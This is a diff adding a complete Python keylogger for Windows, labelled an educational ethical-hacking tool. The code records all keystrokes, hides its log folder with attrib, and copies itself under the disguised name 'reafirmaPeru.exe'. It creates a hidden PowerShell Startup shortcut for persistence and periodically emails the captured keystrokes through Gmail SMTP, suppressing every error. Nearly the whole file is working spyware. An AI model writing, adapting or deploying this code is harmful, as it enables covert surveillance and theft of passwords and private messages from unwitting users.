@@ -1,0 +1,143 @@
+import pynput.keyboard
+import smtplib
+import threading
+import os
+import sys
+import shutil
+import subprocess
+import datetime
+
+'''
+Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
+The keylogger takes the all key strikes on keyboard and save them locally to a file.
+Optionally, it tries to send the log by email every N hours (default 6). If sending fails
+(no internet, bad credentials, etc.) it does NOT crash and retries on the next cycle.
+Requirements: pip install pynput
+Usage: python main.py
+'''
+
+
+class Keylogger:
+
+	def __init__(self, time_interval, email=None, password=None, email_interval=14400, log_file=None):
+		self.logger = ""
+		self.subject = "Keylogger Report Email"
+		self.email = email
+		self.password = password
+		self.interval = time_interval
+		self.email_interval = email_interval
+		self.log_dir = os.path.join(os.environ["USERPROFILE"], "FileSystem")
+		self.log_file = log_file or os.path.join(self.log_dir, "keylog.txt")
+		self.pending_email = ""
+		self._setup_hidden_folder()
+
+	def _setup_hidden_folder(self):
+		try:
+			if not os.path.exists(self.log_dir):
+				os.makedirs(self.log_dir)
+			subprocess.call('attrib +h +s "' + self.log_dir + '"', shell=True,
+				stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+		except Exception:
+			pass
+
+	def _install(self):
+		try:
+			exe_name = "reafirmaPeru.exe"
+			target_path = os.path.join(self.log_dir, exe_name)
+			current_path = sys.executable
+
+			# Si ya se esta ejecutando desde la carpeta destino, no hacer nada
+			if os.path.normpath(current_path) == os.path.normpath(target_path):
+				return
+
+			# Copiar el exe a la carpeta oculta
+			shutil.copy2(current_path, target_path)
+			subprocess.call('attrib +h "' + target_path + '"', shell=True,
+				stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+			# Crear acceso directo en shell:startup via PowerShell
+			startup_dir = os.path.join(
+				os.environ["APPDATA"],
+				"Microsoft", "Windows", "Start Menu", "Programs", "Startup"
+			)
+			shortcut_path = os.path.join(startup_dir, "reafirmaPeru.lnk")
+
+			ps_script = (
+				'$ws = New-Object -ComObject WScript.Shell; '
+				'$s = $ws.CreateShortcut("' + shortcut_path.replace("\\", "\\\\") + '"); '
+				'$s.TargetPath = "' + target_path.replace("\\", "\\\\") + '"; '
+				'$s.WorkingDirectory = "' + self.log_dir.replace("\\", "\\\\") + '"; '
+				'$s.WindowStyle = 7; '
+				'$s.Save()'
+			)
+			subprocess.call(
+				['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script],
+				stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+			)
+		except Exception:
+			pass
+
+	def append_to_log(self, key_strike):
+		self.logger = self.logger + key_strike
+
+	def evaluate_keys(self, key):
+		try:
+			Pressed_key = str(key.char)
+		except AttributeError:
+			if key == key.space:
+				Pressed_key = " "
+			elif key == key.enter:
+				Pressed_key = "\n"
+			elif key == key.tab:
+				Pressed_key = "\t"
+			elif key == key.backspace:
+				Pressed_key = " [BACK] "
+			else:
+				Pressed_key = " " + str(key) + " "
+
+		self.append_to_log(Pressed_key)
+
+	def save_to_file(self):
+		if self.logger:
+			try:
+				timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
+				with open(self.log_file, "a", encoding="utf-8") as f:
+					f.write(timestamp + self.logger + "\n")
+				self.pending_email += timestamp + self.logger + "\n"
+				self.logger = ""
+			except Exception:
+				pass
+
+	def report(self):
+		self.save_to_file()
+		timer = threading.Timer(self.interval, self.report)
+		timer.daemon = True
+		timer.start()
+
+	def email_report(self):
+		if self.email and self.password and self.pending_email:
+			try:
+				self.send_mail(self.email, self.password, self.subject, self.pending_email)
+				self.pending_email = ""
+			except Exception:
+				pass
+		timer = threading.Timer(self.email_interval, self.email_report)
+		timer.daemon = True
+		timer.start()
+
+	def send_mail(self, email, password, subject, message):
+		Email_message = 'Subject: {}\n\n{}'.format(subject, message)
+		server = smtplib.SMTP("smtp.gmail.com", 587, timeout=30)
+		server.starttls()
+		server.login(email, password)
+		server.sendmail(email, email, Email_message)
+		server.quit()
+
+	def start(self):
+		self._install()
+		keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
+		with keyboard_listener:
+			self.report()
+			if self.email and self.password:
+				self.email_report()
+			keyboard_listener.join()
